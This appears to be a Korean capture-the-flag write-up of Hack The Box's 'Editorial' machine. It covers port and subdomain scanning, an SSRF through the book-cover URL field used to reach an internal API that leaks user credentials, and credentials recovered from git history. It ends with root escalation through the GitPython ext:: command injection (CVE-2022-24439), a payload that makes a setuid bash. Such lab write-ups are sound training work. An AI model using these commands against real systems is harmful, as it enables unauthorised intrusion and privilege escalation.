# HTB-EDITORIAL
```bash
OS: Linux
DATE: 26.10.08
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 포트 검사 이후 UDP 포트 검사까지 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
포트 검사 결과 22번 포트와 80(http) 서비스만 동작한다는 것을 알았다. 따라서 웹 접근한 결과 바로 `editorial.htb`로 리다이렉트되어 `/etc/hosts`에 도메인을 추가한 후 열거를 진행하였다
```bash
sudo nano /etc/hosts
```
이후 웹 디렉토리, 서브도메인 fuzzing을 진행하였다
```bash
 ffuf -u http://editorial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://editorial.htb/ -H "Host: FUZZ.editorial.htb" -fs 178
```
```bash
ffuf -u http://editorial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
검사 결과 **upload**와 **about** 페이지를 찾을 수 있었다

## Initial Access
먼저 웹에 접속하여 여러 가지 기능을 확인하던 중 `Editorial Tiempo Arriba`라고 써져 있는 파일과 url로 책 정보를 업로드할 수 있는 페이지를 발견할 수 있었다. 따라서 여러 정보를 입력한 후 burp suite proxy를 사용하려 하였지만 작동이 불가능하였다. 나중에 이유를 확인해보니 내가 python으로 웹 서버를 8080 포트로 열고 있었기에 프록시 포트와 같아져서 불가능했다는 것을 알아 수정 후 다시 한 번 캡처를 진행하였다. 캡처 결과 `/upload` 페이지가 있었고 `/upload-cover`이라는 페이지가 있었다. upload는 책 정보를 입력하고 post로 서버에 전송되는 기능이었고, upload-cover은 웹 주소와 파일을 업로드하고 preview하는 기능이었다. `/upload-cover` 페이지를 자세히 들여다본 결과 파일 업로드 우회를 먼저 살펴보았다. 하지만 어떠한 기능도 동작하지 못하였다. 따라서 bookurl에다 나의 IP와 열어둔 포트를 적고 SSRF 취약 여부를 확인하였다
```js
Content-Disposition: form-data; name="bookurl"

http://IP:1234
```
```bash
nc -nlvp 1234

connect to [IP] from (UNKNOWN) [10.129.81.40] 59830
```
확인 결과 SSRF가 가능하다는 것을 알 수 있었다. 따라서 로컬호스트 주소로 내부 정보를 캐내기 위해 시도하였다. 포트는 당연히 80은 웹 포트인 것을 알기에 다른 포트를 찾기 위해 노력하였다. 따라서 포트 brute force를 진행하였다.
버프스위트로 무작위 대입을 한 결과 5000 포트에만 무언가가 있다는 것을 확인할 수 있었고, 내용을 로컬호스트 포트 5000으로 세팅 후 보내준 결과

![image](attach_real/Pasted%20image%2020261010230128.png)

이와 같이 엔드포인트 주소를 발급해주었다. 하지만 초기에 문제를 겪었다. 똑같이 엔드포인트가 주어지고 접속을 하면 404 상태 코드가 뜨는 것이었다. 원인을 분석한 결과 bookfile과 bookurl 둘 다 값을 넣어주면 서버가 둘 중 하나만 처리하기에 문제가 생겼던 것이었다. 따라서 bookfile은 null로 만들어준 후 bookurl만 사용한 후 서버가 제공해준 엔드포인트에 접속한 결과 API 엔드포인트 목록을 얻을 수 있게 되었다
```js
cat d8b26771-04ab-4690-a413-4fd407f9945d | jq .                                                                                                                                                                                                          
{                                                                                                                                                                                                                                                            
  "messages": [                                                                                                                                                                                                                                              
    {                                                                                                                                                                                                                                                        
      "promotions": {                                                                                                                                                                                                                                        
        "description": "Retrieve a list of all the promotions in our library.",                                                                                                                                                                              
        "endpoint": "/api/latest/metadata/messages/promos",                                                                                                                                                                                                  
        "methods": "GET"                                                                                                                                                                                                                                     
      }                                                                                                                                                                                                                                                      
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}

```
여러 API 엔드포인트에 접속 시도한 결과 `/api/latest/metadata/messages/authors`라는 엔드포인트에서 dev라는 유저의 크레덴셜을 확인할 수 있었다. 따라서 dev 유저로 ssh 접속을 시도한 결과 성공하였다

![dev](attach_real/Pasted%20image%2020261010184824.png)

유저 쉘을 얻은 후 디렉토리를 확인한 결과 ~/apps 디렉토리 안에 `/.git` 숨김 폴더가 있었다. 따라서 과거 커밋을 까보는 작업을 하였다
```bash
git log --online
```
```bash
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```
과거 커밋을 확인한 결과 **prod**라는 유저의 크레덴셜을 확보할 수 있었다

![prod](attach_real/Pasted%20image%2020261010230708.png)

## Privilege Escalation

유저 쉘을 얻고 권한 상승을 위해 `sudo -l`을 시도한 결과 root 권한으로 `/opt/internal_apps/clone_changes/clone_prod_change.py` 스크립트를 실행할 수 있었다. 내용은 이러했다
```python
import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
따라서 사용한 라이브러리에 취약점이 있는지 확인해주었다
```bash
pip3 list

distro-info           1.1+ubuntu0.2
Flask                 2.2.2
gitdb                 4.0.10
GitPython             3.1.29
gunicorn              20.1.0
```
`GitPython` 라이브러리 취약점을 확인해본 결과 `CVE-2022-24439`라는 권한 상승 취약점이 있었다. 대상 취약점은 ext:: 라는 프로토콜을 사용하여 뒤에 오는 문자열을 git이 실행할 명령어로 해석하기에, 명령어를 페이로드로 사용하여 권한 상승이 가능한 취약점이었다. 따라서 `/clone_prod_change.py`를 root 권한으로 사용하여 취약점을 이용하였다

```bash
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cp% /bin/bash% /tmp/rootbash;chmod% +s% /tmp/rootbash"
```
따라서 권한 상승을 성공할 수 있었다

![root](attach_real/Pasted%20image%2020261010192438.png)

## New Inform
- 버프스위트에 문제가 있으면 포트가 겹치는지 항상 확인하자
- 주소 입력창이 있으면 항상 SSRF를 의심하자
- 업로드 취약점이 아닐 수 있다는 것을 염두에 두자
- SSRF 테스트: 나의 포트를 열어두고 만약 응답이 온다면 취약하다. 왜냐하면 SSRF라는 것은 서버가 내가 지정한 주소로 대신 요청을 보내는 것이기 때문이다
- SSRF 취약점을 알게 되었다면 로컬을 털 준비를 하자. 로컬 포트 brute force를 통해 여러 포트 확인
- 서버가 파일이 있으면 파일만 처리, 없으면 URL만 처리할 수도 있다. 만약 그렇다면 하나만 작성해서 SSRF를 시도하자
- git 폴더를 얻었으면 dump가 아니라 과거 커밋을 확인하여 크레덴셜 확보 시도
- git dumper는 웹 서버에 .git 폴더가 실수로 노출됐을 때 그걸 밖에서 긁어오는 도구
- 스크립트를 얻었으면 pip list로 라이브러리 버전을 확보한 후 버전 취약점이 있는지 확인한다
- ext:: 외부 프로그램을 거쳐서 git 저장소에 연결
- sudo로 실행하는 프로그램은 path가 완벽하게 일치해야 한다
- lib 꼭 확인